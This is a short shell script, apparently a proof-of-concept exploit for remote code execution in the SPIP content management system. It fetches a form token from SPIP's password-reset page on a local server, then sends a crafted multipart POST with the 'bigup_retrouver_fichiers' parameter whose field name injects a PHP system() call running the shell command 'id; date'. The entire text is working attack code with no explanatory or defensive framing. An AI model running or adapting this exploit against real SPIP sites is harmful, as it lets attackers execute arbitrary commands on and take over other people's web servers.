echo foo > foo.txt
cmd="id; date"
formulaire_action_args=$(curl -k 'http://127.0.0.1:8000/spip.php?page=spip_pass&lang=fr' | grep -F formulaire_action_args -C 3 | grep -ioP '[0-9a-zA-Z_/=+]{30,}')
echo "formulaire_action_args: $formulaire_action_args"
formulaire_action_args_encoded=$(python3 -c "import sys; from urllib.parse import quote; print(quote(sys.argv[1], safe=str()))" "$formulaire_action_args")
echo "formulaire_action_args_encoded: $formulaire_action_args_encoded"
curl -gv -ki -X POST "http://0.0.0.0:8000/spip.php?page=spip_pass&lang=fr&page=spip_pass&lang=fr&formulaire_action=oubli&formulaire_action_args=$formulaire_action_args_encoded&formulaire_action_sign=&oubli=foo%40foo.foo&nobot=&bigup_retrouver_fichiers=1" -F "RCE['.system('$cmd').die().'][][ll]=@foo.txt"
